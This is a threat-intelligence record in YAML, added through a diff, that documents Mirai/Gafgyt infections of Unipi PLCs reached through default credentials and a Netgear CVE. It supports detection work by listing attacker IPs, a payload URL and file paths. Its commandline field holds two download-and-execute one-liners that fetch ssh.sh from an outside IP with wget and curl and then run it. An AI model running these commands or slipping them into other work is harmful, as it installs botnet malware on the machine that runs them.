@@ -1,0 +1,40 @@
+description: Unipi Technologies programmable logic controllers are being targeted
+  by scans for default credentials and an ancient Netgear vulnerability (CVE-2024-12847),
+  leading to a Mirai/Gafgyt installation.
+date: '2025-05-12'
+authors:
+- Johannes B. Ullrich, Ph.D.
+malware_families:
+- Mirai
+- Gafgyt
+TTPs:
+  processs:
+  - sh
+  - wget
+  - curl
+  commandline:
+  - cd /tmp; rm -rf wget.sh curl.sh; wget http://213.209.143.44/ssh.sh; chmod +x ssh.sh;
+    sh ssh.sh
+  - curl -o http://213.209.143.44/ssh.sh; chmod +x ssh.sh; sh ssh.sh
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  network_connections:
+  - 176.65.148.10:22
+  - 213.209.143.44:80
+  file_modifications:
+  - /tmp/wget.sh
+  - /tmp/curl.sh
+  - /tmp/ssh.sh
+  persistence: ''
+  pipes: ''
+  process_relations: ''
+IOCs:
+  hashes: ''
+  ips:
+  - 176.65.148.10
+  domains: ''
+  urls:
+  - http://213.209.143.44/ssh.sh
+reference: https://isc.sans.edu/diary/It+Is+2025+And+We+Are+Still+Dealing+With+Default+IoT+Passwords+And+Stupid+2013+Router+Vulnerabilities/31940/#comments
+file_creation_date: May 12, 2025
